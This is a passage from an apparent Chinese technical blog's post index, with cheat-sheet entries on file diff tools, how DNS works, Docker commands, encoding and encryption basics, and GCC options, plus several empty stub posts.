<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">正在比较文件 game_old.js 和 GAME_NEW.JS</span><br><span class="line">***** game_old.js</span><br><span class="line">KEY_CODES = &#123;</span><br><span class="line">  32: &#x27;space&#x27;,</span><br><span class="line">***** GAME_NEW.JS</span><br><span class="line">KEY_CODES = &#123;</span><br><span class="line">  13: &#x27;enter&#x27;,</span><br><span class="line">  32: &#x27;space&#x27;,</span><br><span class="line">*****</span><br><span class="line"></span><br><span class="line">***** game_old.js</span><br><span class="line">  37: &#x27;left&#x27;,</span><br><span class="line">  38: &#x27;up&#x27;,</span><br><span class="line">  39: &#x27;right&#x27;,</span><br><span class="line">***** GAME_NEW.JS</span><br><span class="line">  37: &#x27;left&#x27;,</span><br><span class="line">  39: &#x27;right&#x27;,</span><br><span class="line">*****</span><br><span class="line"></span><br><span class="line">***** game_old.js</span><br><span class="line"></span><br><span class="line">    if (KEY_STATUS.up) &#123;</span><br><span class="line">      var rad = ((this.rot-90) * Math.PI)/180;</span><br><span class="line">***** GAME_NEW.JS</span><br><span class="line"></span><br><span class="line">    if (KEY_STATUS.spacr) &#123;</span><br><span class="line">      var rad = ((this.rot-90) * Math.PI)/180;</span><br><span class="line">*****</span><br></pre></td></tr></table></figure>

<p>可见，<code>fc</code>命令会把两个文件中不同的片段显示出来，并分别标注属于哪个文件。输入<code>fc /?</code>可以查看<code>fc</code>命令的更多参数。</p>
<span id="more"></span>
<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><p>在Linux下，可以使用系统自带的<code>diff</code>命令（即difference的缩写），它要比Windows中的<code>fc</code>命令更为强大，比如<code>diff -u game_old.js game_new.js</code>，其中<code>-u</code>参数表示使用标准区别格式，这将使输出内容更容易阅读，结果如下：</p>
<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="comment">--- game_old.js 2018-10-19 11:31:58.054834600 +0800</span></span><br><span class="line"><span class="comment">+++ game_new.js 2018-10-19 11:32:19.667759500 +0800</span></span><br><span class="line"><span class="meta">@@ -4,9 +4,9 @@</span></span><br><span class="line"> //</span><br><span class="line"></span><br><span class="line"> KEY_CODES = &#123;</span><br><span class="line"><span class="addition">+  13: &#x27;enter&#x27;,</span></span><br><span class="line">   32: &#x27;space&#x27;,</span><br><span class="line">   37: &#x27;left&#x27;,</span><br><span class="line"><span class="deletion">-  38: &#x27;up&#x27;,</span></span><br><span class="line">   39: &#x27;right&#x27;,</span><br><span class="line">   40: &#x27;down&#x27;,</span><br><span class="line">   70: &#x27;f&#x27;,</span><br><span class="line"><span class="meta">@@ -392,7 +392,7 @@</span></span><br><span class="line">       this.vel.rot = 0;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line"><span class="deletion">-    if (KEY_STATUS.up) &#123;</span></span><br><span class="line"><span class="addition">+    if (KEY_STATUS.spacr) &#123;</span></span><br><span class="line">       var rad = ((this.rot-90) * Math.PI)/180;</span><br><span class="line">       this.acc.x = 0.5 * Math.cos(rad);</span><br><span class="line">       this.acc.y = 0.5 * Math.sin(rad);</span><br></pre></td></tr></table></figure>

<p>可见，<code>diff</code>命令的输出结果更加丰富，开始它展示了正在比较的2个文件，紧接着它显示了不同之处，其中<code>-</code>开始的段落代表只存在于前一个文件中，不存在于后一个文件中，同理，<code>+</code>开始的段落代表只存在于后一个文件中，不存在于前一个文件中，除此之外的所有段落代表共同存在于2个文件中。一般而言，我们将前一个文件表示为旧文件，后一个文件表示为新文件。输入<code>diff --help</code>可以查看<code>diff</code>命令的更多参数。</p>
<h2 id="图形化程序"><a href="#图形化程序" class="headerlink" title="图形化程序"></a>图形化程序</h2><p>或许使用像前面所述的命令行程序观察结果不是很方便，因此有些人可能会倾向于使用图形化程序，而<a href="http://meldmerge.org/">Meld</a>就是个不错的选择，它开源且跨平台，可用来可视化的观察文件之间的差异。使用Meld比较两文件差异的结果如下：<img src="/images/meld.PNG" alt="Meld结果">可见，Meld用高亮显示文件之间的差异，同时它还提供了前往上一个/下一个差异的按钮，方便用户快速跳转。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>数字货币中的相关术语</title>
    <url>/2018/12/16/digital-currency/</url>
    <content><![CDATA[<h2 id="命名"><a href="#命名" class="headerlink" title="命名"></a>命名</h2><h2 id="挖矿"><a href="#挖矿" class="headerlink" title="挖矿"></a>挖矿</h2><h2 id="矿池"><a href="#矿池" class="headerlink" title="矿池"></a>矿池</h2><h2 id="钱包"><a href="#钱包" class="headerlink" title="钱包"></a>钱包</h2><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2>]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title>DNS 运行机制</title>
    <url>/2020/12/29/dns/</url>
    <content><![CDATA[<p><strong>DNS</strong>（Domain Name System，<strong>域名系统</strong>）的主要任务是进行<strong>主机名</strong>（hostname，也称<strong>域名</strong>）到 <strong>IP 地址</strong>转换的目录服务，它由两部分组成：</p>
<ul>
<li>一个由<strong>分层</strong>的 <strong>DNS 服务器</strong>（DNS server）实现的<strong>分布式数据库</strong></li>
<li>一个使得主机能够查询分布式数据库的<strong>应用层协议</strong></li>
</ul>
<p>DNS 服务器通常是运行 <a href="https://www.isc.org/bind/">BIND</a>（Berkeley Internet Name Domain）软件的 UNIX 机器。DNS 协议运行在 UDP 之上，使用 <strong>53</strong> 号端口。</p>
<span id="more"></span>

<p>除了进行主机名到 IP 地址的转换外，DNS 还提供了一些重要的服务：</p>
<ul>
<li>主机别名（host aliasing）：有着复杂主机名的主机能拥有一个或着多个别名</li>
<li>邮件服务器别名（mail server aliasing）</li>
<li>负载分配（load distribution）：DNS 也用于在冗余的服务器（如冗余的 Web 服务器等）之间进行负载分配。这种负载均衡的缺点为由于 DNS 缓存（如 LDNS 中缓存）的存在，其实际作用很有限。</li>
</ul>
<h2 id="DNS-服务器"><a href="#DNS-服务器" class="headerlink" title="DNS 服务器"></a>DNS 服务器</h2><p>DNS 服务器大致分为 3 种：</p>
<ul>
<li><strong>根 DNS 服务器</strong>：根 DNS 服务器提供 TLD 服务器的 IP 地址。有 400 多个根 DNS 服务器遍及全世界。这些根 DNS 服务器由 13 个不同的组织管理。根 DNS 服务器的全部清单连同管理它们的组织及其 IP 地址可以在<a href="https://root-servers.org/">这里</a>找到。</li>
<li><strong>顶级域（Top-Level Domain，TLD）DNS 服务器</strong>：TLD 服务器提供了权威 DNS 服务器的 IP 地址。对于每个顶级域（如 <code>com</code>、<code>org</code>、<code>net</code>、<code>edu</code> 和 <code>gov</code>）和所有国家的顶级域（如 <code>uk</code>、<code>fr</code>、<code>ca</code> 和 <code>jp</code>），都有 TLD 服务器（或服务器集群）。所有顶级域的列表可参见<a href="https://zh.wikipedia.org/wiki/%E4%BA%92%E8%81%94%E7%BD%91%E9%A1%B6%E7%BA%A7%E5%9F%9F%E5%88%97%E8%A1%A8">维基百科</a>。</li>
<li><strong>权威 DNS 服务器</strong>：在因特网上具有公共可访问主机（如 Web 服务器和邮件服务器）的每个组织机构必须提供公共可访问的 DNS 记录，这些记录将这些主机的名字映射为 IP 地址。一个组织机构的权威 DNS 服务器收藏了这些 DNS 记录。一个组织机构能够选择实现它自己的权威 DNS 服务器以保存这些记录；另一种方法是，该组织能够支付费用，让这些记录存储在某个服务提供商的一个权威 DNS 服务器中。</li>
</ul>
<p>还有另一类重要的 DNS 服务器，称为<strong>本地 DNS 服务器</strong>（Local DNS server，<strong>LDNS</strong>）。严格来说，一个本地 DNS 服务器并不属于该服务器的层次结构，但它对 DNS 层次结构是至关重要的。每个 ISP（如一个居民区的 ISP 或一个机构的 ISP）都有一台本地 DNS 服务器（也叫默认名字服务器）。当主机与某个 ISP 连接时，该 ISP 提供一台主机的 IP 地址，该主机具有一台或多台其本地 DNS 服务器的 IP 地址（通常通过 DHCP）。主机的本地 DNS 服务器通常“临近”本主机。当主机发出 DNS 请求时，该请求被发往本地 DNS 服务器，它起着代理的作用，并将该请求转发到 DNS 服务器层次结构中，大致过程如下所述：</p>
<ol>
<li>客户端向它的本地 DNS 服务器发送一个关于 <code>tieba.baidu.com</code> 的 DNS 查询报文</li>
<li>本地 DNS 服务器将该报文转发到根 DNS 服务器</li>
<li>根 DNS 服务器注意到其 <code>com</code> 前缀并向本地 DNS 服务器返回负责 <code>com</code> 的 TLD 的 IP 地址列表</li>
<li>本地 DNS 服务器则再次向这些 TLD 服务器之一发送查询报文</li>
<li>TLD 服务器注意到 <code>baidu.com</code> 前缀，并用权威 DNS 服务器的 IP 地址进行响应，该权威 DNS 服务器是 <code>dns.baidu.com</code></li>
<li>本地 DNS 服务器直接向 <code>dns.baidu.com</code> 重发查询报文，<code>dns.baidu.com</code> 用 <code>tieba.baidu.com</code> 的 IP 地址进行响应</li>
</ol>
<p>注意到在本例中，为了获得一台主机名的映射，共发送了 8 份 DNS 报文：4 份查询报文和 4 份回答报文！下文将介绍利用 <strong>DNS 缓存</strong>（DNS caching）减少这种查询流量的方法。</p>
<p>上述例子利用了<strong>递归查询</strong>（recursive query）和<strong>迭代查询</strong>（iterative query）。从请求主机到本地 DNS 服务器的查询是递归的，其余的查询是迭代的。从理论上讲，任何 DNS 查询既可以是迭代的也能是递归的。</p>
<h2 id="DNS-协议"><a href="#DNS-协议" class="headerlink" title="DNS 协议"></a>DNS 协议</h2><p>共同实现 DNS 分布式数据库的所有 DNS 服务器存储了<strong>资源记录</strong>（Resource Record，<strong>RR</strong>），RR 提供了主机名到 IP 地址的映射。每个 DNS 回答报文包含了一条或多条资源记录。</p>
<p>资源记录是一个包含了下列字段的 4 元组：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(Name, Value, Type, TTL)</span><br></pre></td></tr></table></figure>

<p>TTL（Time To Live）是该记录的生存时间，它决定了资源记录应当从缓存中删除的时间。Name 和 Value 的值取决于 Type：</p>
<ul>
<li>若 Type = A，则 Name 是主机名，Value 是该主机名对应的 IP 地址。因此，一条类型为 A 的资源记录提供了标准的主机名到 IP 地址的映射。例如 <code>(relay1.bar.foo.com, 145.37.93.126, A)</code> 就是一条类型 A 记录。</li>
<li>若 Type = NS，则 Name 是个域（如 <code>foo.com</code>），而 Value 是个知道如何获得该域中主机 IP 地址的权威 DNS 服务器的主机名。这个记录用于沿着查询链来路要 DNS 查询。例如 <code>(foo.com, dns.foo.com, NS)</code> 就是一条类型为 NS 的记录。</li>
<li>若 Type = CNAME，则 Value 是别名为 Name 的主机对应的规范主机名。该记录能够向查询的主机提供一个主机名对应的规范主机名，例如 <code>(foo.com, relay1.bar.foo.com, CNAME)</code> 就是一条 CNAME 类型的记录。</li>
<li>若 Type = MX，则 Value 是个别名为 Name 的邮件服务器的规范主机名。举例来说，<code>(foo.com, mail.bar.foo.com, MX)</code> 就是一条 MX 记录。MX 记录允许邮件服务器主机名具有简单的别名。值得注意的是，通过使用 MX 记录，一个公司的邮件服务器和其他服务器（如它的 Web 服务器）可以使用相同的别名。为了获得邮件服务器的规范主机名，DNS 客户应当请求一条 MX 记录；而为了获得其他服务器的规范主机名，DNS 客户应当请求 CNAME 记录。</li>
</ul>
<p>如果一台 DNS 服务器是用于某特定主机名的权威 DNS 服务器，那么该 DNS 服务器会有一条包含用于该主机名的类型 A 记录（即使该 DNS 服务器不是其权威 DNS 服务器，它也可能在缓存中包含有一条类型 A 记录）。如果服务器不是用于某主机名的权威服务器，那么该服务器将包含一条类型 NS 记录，该记录对应于包含主机名的域；它还将包括一条类型 A 记录，该记录提供了在 NS 记录的 Value 字段中的 DNS 服务器的 IP 地址。</p>
<p>DNS 只有查询和回答这两种报文，并且，查询和回答报文有着相同的格式，如下图所示：</p>
<p><img src="/images/dns-message.jpg" alt="dns message"></p>
<p>前 12 个字节是<strong>首部区域</strong>，其中有如下几个字段：</p>
<ul>
<li>标识符：是一个 16 比特的数，用于标识该查询。这个标识符会被复制到对查询的回答报文中，以便让客户用它来匹配发送的请求和接收到的回答。</li>
<li>标志：含有若干标志。1 比特的“<strong>查询/回答</strong>”标志位指出报文是查询报文（0）还是回答报文（1）。当某 DNS 服务器是所请求名字的权威 DNS 服务器时，1 比特的“<strong>权威的</strong>”标志位被置在回答报文中。如果客户在该 DNS 服务器没有某记录时希望它执行递归查询，将设置 1 比特的“<strong>希望递归</strong>”标志位。如果该 DNS 服务器支持递归查询，在它的回答报文中会对 1 比特的“<strong>递归可用</strong>”标志位置位。</li>
<li>剩余 4 个有关数量的字段，这些字段指出了在首部后的 4 类数据区域出现的数量。</li>
</ul>
<p><strong>问题区域</strong>包含着正在进行的查询信息。该区域包括：</p>
<ol>
<li>名字字段，包含正在被查询的主机名字；</li>
<li>类型字段，指出有关该名字的正被询问的问题类型，例如主机地址是与一个名字相关联（类型 A）还是与某个名字的邮件服务器相关联（类型 MX）。</li>
</ol>
<p>在来自 DNS 服务器的回答中，<strong>回答区域</strong>包含了对最初请求的名字的资源记录。在回答报文的回答区域中可以包含多条 RR，因此一个主机名能够有多个 IP 地址。</p>
<p><strong>权威区域</strong>包含了其他权威服务器的记录。</p>
<p><strong>附加区域</strong>包含了其他有帮助的记录。例如，对于一个 MX 请求的回答报文的回答区域包含了一条资源记录，该记录提供了邮件服务器的规范主机名。该附加区域包含一个类型 A 记录，该记录提供了用于该邮件服务器的规范主机名的 IP 地址。</p>
<p>上面的讨论只是关注如何从 DNS 数据库中取数据，这些数据最初是怎么进入数据库中的呢？<strong>注册登记机构</strong>（registrar）是一个商业实体，它验证域名的唯一性，并将域名输入 DNS 数据库，对提供的服务收取少量费用。<strong>因特网名字和地址分配机构</strong>（Internet Corporation for Assigned Names and Numbers，<strong>ICANN</strong>）向各种注册登记机构授权。</p>
<h2 id="DNS-缓存"><a href="#DNS-缓存" class="headerlink" title="DNS 缓存"></a>DNS 缓存</h2><p>实际上，为了改善时延性能并减少在因特网上到处传输的 DNS 报文数量，DNS 广泛使用了缓存技术。</p>
<p>DNS 缓存的原理非常简单。在一个请求链中，当某 DNS 服务器接收一个 DNS 回答（例如，包含某主机名到 IP 地址的映射）时，它能将映射缓存到本地存储器中。如果在 DNS 服务器中缓存了一台主机名/IP 地址对，另一个对相同主机名的查询到达该 DNS 服务器时，该 DNS 服务器就能够提供所要求的 IP 地址，即使它不是该主机名的权威服务器。由于主机和主机名与 IP 地址间的映射并不是永久的，DNS 服务器在一段时间后（通常设置为两天）将丢弃缓存的信息。</p>
<p>本地 DNS 服务器也能够缓存 TLD 服务器的 IP 地址，因而允许本地 DNS 绕过查询链中的根 DNS 服务器。事实上，因为缓存，除了少数 DNS 查询以外，根服务器被绕过了。</p>
<h2 id="安全性"><a href="#安全性" class="headerlink" title="安全性"></a>安全性</h2><p>第一种针对 DNS 服务的攻击是分布式拒绝服务（DDoS）带宽洪泛攻击，对 DNS 的潜在更为有效的 DDoS 攻击将是向顶级域名服务器（例如向所有处理 <code>.com</code> 域的顶级域名服务器）发送大量的 DNS 请求，以上两种 DDoS 攻击的严重性都可以通过本地 DNS 服务器中的缓存技术可将部分地被缓解。</p>
<p>DNS 能够潜在地以其他方式被攻击。在中间人攻击中，攻击者截获来自主机的请求并返回伪造的回答，这被称为 <strong>DNS 劫持</strong>。在 <strong>DNS 毒害</strong>（DNS 投毒、DNS 污染）攻击中，攻击者向一台 DNS 服务器发送伪造的回答，诱使服务器在它的缓存中接收伪造的记录。这些攻击中的任一种，都能够将毫无疑虑的 Web 用户重定向到攻击者的 Web 站点。然而，这些攻击难以实现，因为它们要求截获分组或扼制住服务器。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker 入坑指南</title>
    <url>/2018/08/31/docker/</url>
    <content><![CDATA[<p>Docker 是一种基于 Linux 的容器化技术，类似于轻量的虚拟机。它采用 <strong>C/S</strong> 架构，使用 Go 语言开发。</p>
<h2 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h2><p>Docker 分为 2 个版本：<strong>社区版</strong>（Community Edition, CE）和<strong>企业版</strong>（Enterprise Edition, EE），顾名思义，企业版是收费的。</p>
<p>针对 macOS 10.10.3 和 Windows 10，Docker 还推出了 <a href="https://www.docker.com/products/docker-desktop">Docker Desktop</a>，Docker Desktop 又分为 2 个渠道（channel），<strong>稳定渠道</strong>（Stable）和<strong>抢先渠道</strong>（Edge），需要注意的是，Docker Desktop 对系统是有要求的，例如，针对 Win10 的 <a href="https://store.docker.com/editions/community/docker-ce-desktop-windows">Docker for Windows</a> 因为要用到 Hyper-V 虚拟机，所以要求系统是 64 位专业版或企业版并开启 Hyper-V 功能。</p>
<p>针对老版本的 Windows 或 macOS，可以使用 <a href="https://docs.docker.com/toolbox/overview/">Docker Toolbox</a>，它会附带安装一个 VirtualBox 虚拟机。</p>
<p>使用 <code>docker version</code> 可以查看 docker 版本号，使用 <code>docker info</code> 可以查看 docker 详细信息，直接输入 <code>docker</code> 可以查看 docker 相关命令。</p>
<span id="more"></span>
<h2 id="镜像"><a href="#镜像" class="headerlink" title="镜像"></a>镜像</h2><p><strong>镜像</strong>（image）文件可以用来生成容器实例，其类似于在虚拟机中安装操作系统时所使用的 ISO 镜像。</p>
<p>镜像文件可以包含一个标签（tag），即版本号。</p>
<p>你可以使用远程仓库中别人制作好的镜像文件，也可以自己制作镜像文件。要制作镜像文件就要编写 <strong>Dockerfile</strong> 文件，其类似于 Makefile 文件。</p>
<p>与 image 相关的常用命令如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 列出本机的所有image文件</span></span><br><span class="line">docker image ls</span><br><span class="line">docker images</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除指定的image文件</span></span><br><span class="line">docker image rm &lt;image-name&gt;</span><br><span class="line">docker rmi &lt;image-name&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将指定的image文件从远程仓库拉取到本地</span></span><br><span class="line">docker image pull &lt;image-name&gt;[:tag]</span><br><span class="line">docker pull &lt;image-name&gt;[:tag]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用当前文件夹中的Dockerfile制作一个名为demo、tag为0.0.1的image文件</span></span><br><span class="line"><span class="comment"># 若不指定tag，则默认的标签为latest</span></span><br><span class="line">docker image build -t demo:0.0.1 .</span><br><span class="line">docker build -t demo:0.0.1 .</span><br></pre></td></tr></table></figure>

<h2 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h2><p>镜像文件生成的容器（container）实例，本身也是一个文件，称为<strong>容器文件</strong>。当关闭容器时，并不会删除容器文件，只是容器停止运行而已。</p>
<p>类似于在虚拟机中安装的操作系统，其本身会在硬盘中创建一系列文件，当关闭操作系统时，相应的文件并不会删除。</p>
<p>与 container 相关的常用命令如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 从指定的image文件生成一个正在运行的容器实例，</span></span><br><span class="line"><span class="comment"># 若本地没有指定的image文件，会从远程仓库中自动拉取下来并运行</span></span><br><span class="line"><span class="comment"># 使用参数`-it`返回容器实例的终端</span></span><br><span class="line"><span class="comment"># 使用参数`--rm`在关闭容器后删除容器文件</span></span><br><span class="line"><span class="comment"># 使用参数`-p`将容器内端口映射到主机端口</span></span><br><span class="line"><span class="comment"># 使用参数`-v`将主机目录和容器内目录进行绑定</span></span><br><span class="line">docker container run &lt;image-name&gt;[:tag]</span><br><span class="line">docker run &lt;image-name&gt;[:tag]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列出本机正在运行的容器，使用参数`-all`列出所有容器文件</span></span><br><span class="line">docker container ls</span><br><span class="line">docker ps</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除指定的容器文件</span></span><br><span class="line">docker container rm &lt;container-id&gt;</span><br><span class="line">docker rm &lt;container-id&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动指定的容器实例</span></span><br><span class="line">docker container start &lt;container-id&gt;</span><br><span class="line">docker start &lt;container-id&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启指定的容器实例</span></span><br><span class="line">docker container restart &lt;container-id&gt;</span><br><span class="line">docker restart &lt;container-id&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭指定的容器实例</span></span><br><span class="line">docker container stop &lt;container-id&gt;</span><br><span class="line">docker stop &lt;container-id&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 强制关闭指定的容器实例</span></span><br><span class="line">docker container <span class="built_in">kill</span> &lt;container-id&gt;</span><br><span class="line">docker <span class="built_in">kill</span> &lt;container-id&gt;</span><br><span class="line"></span><br><span class="line">docker cp</span><br><span class="line">docker attach</span><br><span class="line">docker <span class="built_in">exec</span>（重要）</span><br></pre></td></tr></table></figure>

<h2 id="仓库"><a href="#仓库" class="headerlink" title="仓库"></a>仓库</h2><p><strong>仓库</strong>（repository）是不同标签的镜像的集合，注册处（registry）又是不同仓库的集合，Docker 的官方注册处是 <a href="https://hub.docker.com/">Docker Hub</a>，类似于 GitHub。使用 <code>docker login</code> 可以登录到自己在 Docker Hub 上注册的帐号。值得注意的是，国内访问 Docker Hub 速度较慢，建议设置代理或使用国内镜像站。一般来说，国内镜像站只包含流行的公有镜像，私有镜像仍需要从 Docker Hub 中拉取。</p>
<p>与 repository 相关的命令如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 从Docker Hub中搜索某个 image</span></span><br><span class="line">docker search [image-name]</span><br></pre></td></tr></table></figure>

<h2 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h2><h2 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h2><p>阿里云镜像加速</p>
<h2 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h2><h3 id="Drive-has-not-been-shared"><a href="#Drive-has-not-been-shared" class="headerlink" title="Drive has not been shared"></a>Drive has not been shared</h3><p>在 Windows 10 上启动 Docker 可能会遇到 <code>Unhandled exception: Drive has not been shared</code> 这样的问题，可以通过勾选 Settings ——&gt; Resources ——&gt; FILE SHARING 中相应的磁盘以解决此问题。若提示 <code>Cannot change shared directories</code>，则你可能需要重启 Docker 后再次进行上述操作。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title>编码与加密</title>
    <url>/2018/05/08/encode-encrypt/</url>
    <content><![CDATA[<h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><p>编码（encode）是信息从一种形式或格式转换为另一种形式的过程。相应的，解码（decode）是编码的逆过程。</p>
<p>常见的编码算法有 ASCII 编码、URL 编码、HTML 编码、<a href="/2018/08/10/base/" title="Base64 编码">Base64 编码</a>等。</p>
<h2 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h2><p><strong>加密</strong>（encryption）是将<strong>明文</strong>（plaintext，cleartext）信息改变为难以读取的<strong>密文</strong>（ciphertext）内容，使之不可读。只有拥有解密方法的对象，经由<strong>解密</strong>（decryption）过程，才能将密文还原为正常可读的内容。</p>
<p>现代密码学中的加密算法可以分为两类：<strong>对称加密（Symmetric encryption）</strong>和<strong>非对称加密（Asymmetric encryption）</strong>。</p>
<p>对称加密就是将信息使用一个密钥进行加密，解密时使用同样的密钥，同样的算法进行解密。</p>
<p>非对称加密，又称<strong>公开密钥加密</strong>，是加密和解密使用不同密钥的算法，一个是公开密钥，一个是私有密钥，一个用作加密的时候，另一个则用作解密，虽然两个密钥在数学上相关，但如果知道了其中一个，并不能凭此计算出另外一个。在通信中，加密通常使用的是对方的公钥，当对方收到密文后可以使用自己的私钥解密。如果加密使用的是自己的私钥，则密文可由任何人解密，由此可验证该文件必定出自该用户，这亦称作<strong>数字签名（Digital Signature）</strong>。</p>
<p>跑题一下，实际上为了性能，数字签名并不是直接使用私钥加密明文，而是使用私钥加密明文的哈希值。</p>
<p>常见的对称加密算法有 DES、3DES、AES、RC5 等。</p>
<p>常见的非对称加密算法有 <a href="/2018/10/18/rsa/" title="RSA">RSA</a>、DSA、ECDSA、Elgamal 等。</p>
<p>非对称加密在计算上相当复杂，速度远远比不上对称加密，因此，在一般实际情况下，往往通过非对称加密来随机创建临时的对称密钥，亦即对话键，然后才通过对称加密来传输大量、主体的数据。</p>
<p>加密算法实质上是<strong>密码算法</strong>中的一种，另一种则是<strong>哈希（hash）算法</strong>。</p>
<span id="more"></span>
<h2 id="哈希"><a href="#哈希" class="headerlink" title="哈希"></a>哈希</h2><p>哈希算法，又称为散列算法，就是把任意长度的输入变换成固定长度的输出，是一种不可逆的算法，也就是说不能通过密文（即哈希值）反算出明文，这是一种单向加密的算法。另外，多个不同的明文可能会得到同一个密文，因为值域是有限的，这种情况称为<strong>冲突</strong>。一个优秀的哈希算法会尽量的减少这种冲突性。</p>
<p>常见的哈希算法有 MD5、SHA-1、SHA-256、CRC-32、CRC-64 等。</p>
<hr>
<p>注意：</p>
<ol>
<li>密码学建议，不要使用任何自己创造的私有加密算法，应该使用广泛使用的公开加密算法，这些都是已被证明安全的。</li>
<li>编码与加密主要的区别在于，所用的 Key 是否是公共所知的，或者说，编码根本就没有 Key。</li>
</ol>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>密码学</tag>
      </tags>
  </entry>
  <entry>
    <title>辗转相除法</title>
    <url>/2018/09/12/euclidean/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title>对比几种文件共享协议</title>
    <url>/2019/04/17/file-sharing-protocol/</url>
    <content><![CDATA[<h2 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h2><p><strong>SMB</strong>全称Server Message Block（即服务器消息块），又称Common Internet File System（即网络文件共享系统），所以也常被缩写为<strong>SMB/CIFS</strong>。</p>
<h2 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h2><h2 id="NFS"><a href="#NFS" class="headerlink" title="NFS"></a>NFS</h2>]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title>前端相关术语</title>
    <url>/2018/09/14/front-end-terminology/</url>
    <content><![CDATA[<h2 id="轮播图"><a href="#轮播图" class="headerlink" title="轮播图"></a>轮播图</h2><p>轮播图，在Bootstrap中又被称为Carousel，是当今网站主页非常常用的一种动态效果。</p>
<h2 id="视差滚动"><a href="#视差滚动" class="headerlink" title="视差滚动"></a>视差滚动</h2><p>视差滚动，又称Parallax Scrolling，指让多层背景以不同的速度移动，形成立体的运动效果，带来非常出色的视觉体验。</p>
<h2 id="ToolTip"><a href="#ToolTip" class="headerlink" title="ToolTip"></a>ToolTip</h2><p>ToolTip，在Bootstrap 4 中又被称为提示冒泡。</p>
<h2 id="手风琴效果"><a href="#手风琴效果" class="headerlink" title="手风琴效果"></a>手风琴效果</h2><p>手风琴效果，又被称为Accordion。</p>
<h2 id="哈林摇"><a href="#哈林摇" class="headerlink" title="哈林摇"></a>哈林摇</h2><p>哈林摇，又称Harlem Shake。</p>
<h2 id="响应式布局"><a href="#响应式布局" class="headerlink" title="响应式布局"></a>响应式布局</h2><p>响应式布局，又称Responsive Layout，即一个布局可以适应多个不同终端。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>GCC 小记</title>
    <url>/2019/04/18/gcc/</url>
    <content><![CDATA[<p>GCC 一般有两层意思，广义是指 GNU Compiler Collection（即 GNU 编译器套装），狭义是指 GNU C Compiler（即 GNU C 语言编译器），在本文中，我默认大写的 GCC 指广义，小写的 gcc 指狭义。</p>
<p>使用 gcc 编译 C 语言源代码的一般格式如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc test.c -o <span class="built_in">test</span></span><br></pre></td></tr></table></figure>
<span id="more"></span>
<h2 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h2><p>Linux下 <code>gcc</code> 命令常用的参数及其含义如下所示：</p>
<ul>
<li><code>--help</code>：显示帮助信息</li>
<li><code>-o</code>：指定生成的文件名，若不指定，则默认生成 <code>a.out</code></li>
<li><code>-E</code>：生成 <code>.i</code> 格式的预处理文件</li>
<li><code>-S</code>：生成 <code>.s</code> 格式的汇编文件</li>
<li><code>-c</code>：生成 <code>.o</code> 格式的二进制文件</li>
<li><code>-save-temps</code>：保留所有生成的中间文件</li>
<li><code>-g</code>：生成必要的符号信息，为调试而用</li>
<li><code>-ggdb</code>：生成可特供于 gdb 使用的调试信息</li>
<li><code>-gstabs</code>：生成 stabs 格式的调试信息</li>
<li><code>-Wall</code>：显示所有常用的警告信息，即 Warning all</li>
<li><code>-m32</code>：指定生成 32 位程序</li>
<li><code>-Os</code>：为减小代码大小而进行优化，即 Optimizers small</li>
<li><code>-nostdinc</code>：不使用标准库</li>
<li><code>-fno-stack-protector</code>：不生成用于检测缓冲区溢出的代码</li>
<li><code>-I&lt;dir&gt;</code>：添加搜索头文件的路径</li>
<li><code>-fno-builtin</code>：除非用 <code>__builtin_</code> 前缀，否则不进行 <code>builtin</code> 函数的优化</li>
</ul>
